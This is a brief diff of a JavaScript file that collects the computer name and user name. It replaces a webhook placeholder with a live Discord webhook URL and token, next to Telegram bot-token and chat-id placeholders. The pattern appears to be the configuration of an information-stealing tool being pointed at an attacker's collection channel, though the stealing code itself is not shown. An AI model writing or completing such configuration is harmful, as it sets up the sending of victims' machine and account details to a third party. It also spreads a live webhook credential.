@@ -3,7 +3,7 @@ const computerName = process.env.COMPUTERNAME || process.env.HOSTNAME || process
 const username = process.env.USERNAME || process.env.USER || process.env.LOGNAME;
 
 const config = {
-  webhook: "%WEBHOOK%",
+  webhook: "https://discord.com/api/webhooks/1412463264746704967/ZLnheMsfHklkF78R-X0wQkI4ThNutSZhRt5tcn1TRmYX18SzyQu4KytPYXjt7eAzYC4q",
   chat_id: "%TELEGRAM_CHATID%",
   user_id: "%TELEGRAM_USERID%",
   bot_token: "%TELEGRAM_BOTTOKEN%",
